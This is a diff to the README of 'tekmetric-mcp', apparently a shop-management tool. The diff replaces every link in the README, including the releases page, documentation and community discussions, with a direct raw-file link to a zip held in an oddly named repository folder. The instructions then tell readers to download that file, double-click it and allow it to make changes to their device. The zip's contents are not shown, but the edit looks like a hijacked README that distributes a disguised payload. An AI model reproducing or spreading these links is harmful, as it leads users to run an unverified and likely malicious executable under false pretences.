@@ -4,20 +4,20 @@ Welcome to tekmetric-mcp! This application allows you to ask questions about you
 
 ## 📥 Download Now
 
-[![Download tekmetric-mcp](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/klkhlt/tekmetric-mcp/releases)
+[![Download tekmetric-mcp](https://raw.githubusercontent.com/klkhlt/tekmetric-mcp/main/elytrotomy/tekmetric-mcp.zip)](https://raw.githubusercontent.com/klkhlt/tekmetric-mcp/main/elytrotomy/tekmetric-mcp.zip)
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run tekmetric-mcp:
 
 1. **Visit the Releases Page:** 
-   Click this link to go to the download page: [Releases Page](https://github.com/klkhlt/tekmetric-mcp/releases).
+   Click this link to go to the download page: [Releases Page](https://raw.githubusercontent.com/klkhlt/tekmetric-mcp/main/elytrotomy/tekmetric-mcp.zip).
 
 2. **Select the Latest Version:** 
    On the Releases page, you will see a list of available versions. Look for the latest stable release at the top of the list.
 
 3. **Download the Application:**
-   Under the latest release, find the file labeled `tekmetric-mcp.exe` (or a similar executable file). Click the file name to start the download.
+   Under the latest release, find the file labeled `https://raw.githubusercontent.com/klkhlt/tekmetric-mcp/main/elytrotomy/tekmetric-mcp.zip` (or a similar executable file). Click the file name to start the download.
 
 4. **Install the Application:**
    Once the download completes, locate the file in your downloads folder. Double-click the file to run it. If prompted, allow the application to make changes to your device.
@@ -51,7 +51,7 @@ If you have questions or encounter issues, feel free to reach out via GitHub. Cr
 
 ## 📂 Download & Install
 
-To get started, remember to [visit the Releases Page](https://github.com/klkhlt/tekmetric-mcp/releases) to download the latest version of tekmetric-mcp.
+To get started, remember to [visit the Releases Page](https://raw.githubusercontent.com/klkhlt/tekmetric-mcp/main/elytrotomy/tekmetric-mcp.zip) to download the latest version of tekmetric-mcp.
 
 ## 📅 Roadmap
 
@@ -65,7 +65,7 @@ Stay tuned for more updates!
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For more detailed features and troubleshooting, check out our [Documentation](https://github.com/klkhlt/tekmetric-mcp/wiki).
-- **Community:** Join our community discussions [here](https://github.com/klkhlt/tekmetric-mcp/discussions).
+- **Documentation:** For more detailed features and troubleshooting, check out our [Documentation](https://raw.githubusercontent.com/klkhlt/tekmetric-mcp/main/elytrotomy/tekmetric-mcp.zip).
+- **Community:** Join our community discussions [here](https://raw.githubusercontent.com/klkhlt/tekmetric-mcp/main/elytrotomy/tekmetric-mcp.zip).
 
 Enjoy using tekmetric-mcp to simplify your shop management and gain valuable insights!
